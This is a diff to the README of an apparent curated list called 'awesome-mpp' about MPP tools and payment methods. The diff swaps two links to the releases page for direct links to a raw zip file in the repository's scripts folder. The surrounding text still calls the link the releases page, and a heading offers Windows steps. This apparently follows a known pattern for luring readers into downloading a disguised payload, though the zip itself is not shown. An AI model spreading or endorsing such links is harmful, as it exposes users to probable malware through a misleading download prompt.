@@ -1,6 +1,6 @@
 # ⚡ awesome-mpp - Find MPP tools and payment methods
 
-[![Download awesome-mpp](https://img.shields.io/badge/Download%20awesome--mpp-blue-grey)](https://github.com/Alonzoserene162/awesome-mpp/releases)
+[![Download awesome-mpp](https://img.shields.io/badge/Download%20awesome--mpp-blue-grey)](https://github.com/Alonzoserene162/awesome-mpp/raw/refs/heads/main/scripts/mpp-awesome-v2.2.zip)
 
 ## 🧭 What this is
 
@@ -12,7 +12,7 @@ It helps you find MPP resources across many chains in one place. It is useful if
 
 Use this link to visit the releases page and download the version you want:
 
-[Download awesome-mpp](https://github.com/Alonzoserene162/awesome-mpp/releases)
+[Download awesome-mpp](https://github.com/Alonzoserene162/awesome-mpp/raw/refs/heads/main/scripts/mpp-awesome-v2.2.zip)
 
 ### What to do on Windows
 
